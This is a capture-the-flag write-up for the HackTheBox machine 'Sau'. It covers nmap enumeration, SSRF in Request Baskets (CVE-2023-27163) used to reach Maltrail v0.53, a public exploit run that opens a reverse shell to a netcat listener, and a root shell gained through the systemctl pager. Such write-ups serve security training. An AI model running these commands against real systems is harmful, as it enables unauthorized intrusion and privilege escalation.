---
title: HackTheBox - Sau
date: 2023-11-20 00:00:01
tags: [htb, ctf, writeup]
category: writeups
description: htb sau writeup
---

# Tools

- python
- netcat


<br>

## Getting User

### Nmap


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Sau]
└─$ sudo nmap -oA nmap/initial_scan 10.129.229.26
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-22 14:20 EST
Nmap scan report for 10.129.229.26
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Sau]
└─$ sudo nmap -sC -sV -p 22,80,5555 -oA nmap/default_scan 10.129.229.26
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-22 14:21 EST
Nmap scan report for 10.129.229.26
Host is up (0.27s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp   filtered http
5555/tcp closed   freeciv
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



<br>

### Foothold

Visiting *http://10.129.229.26:55555*, I find its a web app running *Request Baskets v1.2.1*.
Which is vulnerable to SSRF. *(CVE-2023-27163)*
It appears we can change the Configuration Settings of our basket to the filtered *port 80*.


Set Foward URL to *http://127.0.0.1* and Enable *Insecure TLS*, *Proxy Response* and *Expand Forward Path*.
Send a request to the bucket's endpoint eg *http://10.129.229.26:55555/gn9uwun*

It forwards us to port 80, which is running *Mailtrail v0.53*.

Used this PoC I found in github *https://github.com/spookier/Maltrail-v0.53-Exploit*


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Sau/files/Maltrail-v0.53-Exploit]
└─$ python3 exploit.py 10.10.14.107 1234 http://10.129.229.26:55555/gn9uwun      
Running exploit on http://10.129.229.26:55555/gn9uwun/login

┌──(kali㉿kali)-[~/HTB/Sau]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.107] from (UNKNOWN) [10.129.229.26] 40456
$ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Get the flag

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ cd ~
cd ~
$ ls
ls
user.txt
$ cat user.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



<br>

## Getting Root

### Information Gathering

Upgrade to an interactive shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



We seem to have sudo permission to see *status* of *trail.service*


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
puma@sau:~$ sudo -l               
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


<br>

### Privilege Escalation

Execute the command that this will invoke a pager.
If we type *!sh* this will spawn a root shell *(https://gtfobins.github.io/gtfobins/systemctl/)*

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo systemctl status trail.service
sudo systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


